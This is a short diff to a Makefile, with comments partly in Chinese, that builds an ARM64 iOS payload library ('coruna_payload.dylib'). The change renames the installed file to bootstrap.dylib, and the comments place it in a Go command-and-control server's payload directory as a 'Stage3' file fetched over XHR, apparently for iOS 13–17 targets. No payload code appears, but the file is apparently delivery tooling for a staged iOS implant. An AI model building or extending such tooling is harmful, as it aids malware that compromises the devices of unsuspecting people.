@@ -10,7 +10,7 @@
 #
 # Usage:
 #   make          → build coruna_payload.dylib (ARM64 iOS)
-#   make install  → copy to ../code.dylib（与 Go C2 / __DS_DYLIB_NAME__ 一致）
+#   make install  → copy to ../bootstrap.dylib（与 Stage3 payloads/bootstrap.dylib 一致）
 #   make clean    → remove build artefacts
 # ────────────────────────────────────────────────────────────────────────────
 
@@ -63,10 +63,10 @@ $(TARGET): $(OBJ)
 	$(CC) $(CFLAGS) -c $< -o $@
 
 # ── Install to Go C2 payload directory ───────────────────────────────────────
-# 输出到 payloads/ios1317/code.dylib，HTTP 路径为 GET /code.dylib
+# 输出到 payloads/ios1317/bootstrap.dylib，XHR 路径 payloads/bootstrap.dylib
 install: $(TARGET)
-	cp $(TARGET) ../code.dylib
-	@echo "Installed → ../code.dylib"
+	cp $(TARGET) ../bootstrap.dylib
+	@echo "Installed → ../bootstrap.dylib"
 
 # ── Ad-hoc codesign (optional, for testing without provisioning) ──────────────
 sign: $(TARGET)
